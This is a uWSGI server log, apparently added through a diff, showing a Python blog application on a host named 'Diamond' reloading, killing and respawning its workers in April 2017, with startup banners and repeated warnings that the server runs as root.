+Respawned uWSGI worker 1 (new pid: 30958)
+...brutally killing workers...
+...brutally killing workers...
+Gracefully killing worker 2 (pid: 9912)...
+worker 9 buried after 6 seconds
+worker 10 buried after 6 seconds
+worker 2 buried after 25 seconds
+worker 8 buried after 38 seconds
+worker 7 buried after 39 seconds
+worker 7 buried after 38 seconds
+worker 6 buried after 38 seconds
+worker 5 buried after 38 seconds
+worker 10 buried after 39 seconds
+worker 3 buried after 45 seconds
+worker 4 buried after 45 seconds
+worker 9 buried after 45 seconds
+worker 1 buried after 45 seconds
+binary reloading uWSGI...
+chdir() to /var/www/Blog
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (/var/www/Blog/Blog.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from blog.ini
+*** Starting uWSGI 2.0.14 (64bit) on [Wed Apr  5 18:17:50 2017] ***
+compiled with version: 6.2.0 20161005 on 17 January 2017 01:23:52
+os: Linux-4.8.0-30-generic #32-Ubuntu SMP Fri Dec 2 03:43:27 UTC 2016
+nodename: Diamond
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Blog
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Blog
+your processes number limit is 2790
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /var/www/Blog/Blog.sock fd 3
+Python version: 3.5.2+ (default, Sep 22 2016, 12:18:14)  [GCC 6.2.0 20160927]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x55a2c3478f00
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 800360 bytes (781 KB) for 10 cores
+*** Operational MODE: preforking ***
+worker 2 buried after 47 seconds
+worker 4 buried after 47 seconds
+worker 5 buried after 48 seconds
+worker 6 buried after 48 seconds
+worker 8 buried after 48 seconds
+worker 1 buried after 48 seconds
+worker 3 buried after 48 seconds
+binary reloading uWSGI...
+chdir() to /var/www/Blog
+closing all non-uwsgi socket fds > 2 (max_fd = 1024)...
+found fd 3 mapped to socket 0 (/var/www/Blog/Blog.sock)
+running /usr/local/bin/uwsgi
+[uWSGI] getting INI configuration from /root/blog.ini
+*** Starting uWSGI 2.0.14 (64bit) on [Wed Apr  5 18:17:52 2017] ***
+compiled with version: 6.2.0 20161005 on 17 January 2017 01:23:52
+os: Linux-4.8.0-30-generic #32-Ubuntu SMP Fri Dec 2 03:43:27 UTC 2016
+nodename: Diamond
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /var/www/Blog
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/Blog
+your processes number limit is 2790
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 inherited UNIX address /var/www/Blog/Blog.sock fd 3
+Python version: 3.5.2+ (default, Sep 22 2016, 12:18:14)  [GCC 6.2.0 20160927]
+*** Python threads support is disabled. You can enable it with --enable-threads ***
+Python main interpreter initialized at 0x55d68852cf00
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 800360 bytes (781 KB) for 10 cores
+*** Operational MODE: preforking ***
+WSGI app 0 (mountpoint='') ready in 3 seconds on interpreter 0x55a2c3478f00 pid: 29097 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 29097)
+spawned uWSGI worker 1 (pid: 32408, cores: 1)
+spawned uWSGI worker 2 (pid: 32409, cores: 1)
+spawned uWSGI worker 3 (pid: 32410, cores: 1)
+spawned uWSGI worker 4 (pid: 32411, cores: 1)
+spawned uWSGI worker 5 (pid: 32412, cores: 1)
+spawned uWSGI worker 6 (pid: 32413, cores: 1)
+spawned uWSGI worker 7 (pid: 32414, cores: 1)
+spawned uWSGI worker 8 (pid: 32415, cores: 1)
+spawned uWSGI worker 9 (pid: 32416, cores: 1)
+spawned uWSGI worker 10 (pid: 32417, cores: 1)
+WSGI app 0 (mountpoint='') ready in 2 seconds on interpreter 0x55d68852cf00 pid: 28666 (default app)
+*** uWSGI is running in multiple interpreter mode ***
+gracefully (RE)spawned uWSGI master process (pid: 28666)
+spawned uWSGI worker 1 (pid: 32429, cores: 1)
+spawned uWSGI worker 2 (pid: 32430, cores: 1)
+spawned uWSGI worker 3 (pid: 32431, cores: 1)
+spawned uWSGI worker 4 (pid: 32432, cores: 1)
+spawned uWSGI worker 5 (pid: 32433, cores: 1)
+spawned uWSGI worker 6 (pid: 32434, cores: 1)
+spawned uWSGI worker 7 (pid: 32435, cores: 1)
+spawned uWSGI worker 8 (pid: 32436, cores: 1)
+spawned uWSGI worker 9 (pid: 32437, cores: 1)
+spawned uWSGI worker 10 (pid: 32438, cores: 1)
+Wed Apr  5 18:18:33 2017 - uWSGI worker 9 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Apr  5 18:18:33 2017 - uWSGI worker 8 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Apr  5 18:18:33 2017 - uWSGI worker 10 screams: UAAAAAAH my master disconnected: i will kill myself !!!
+Wed Apr  5 18:18:33 2017 - uWSGI worker 8 screams: UAAAAAAH my master disconnected: i will kill myself !!!
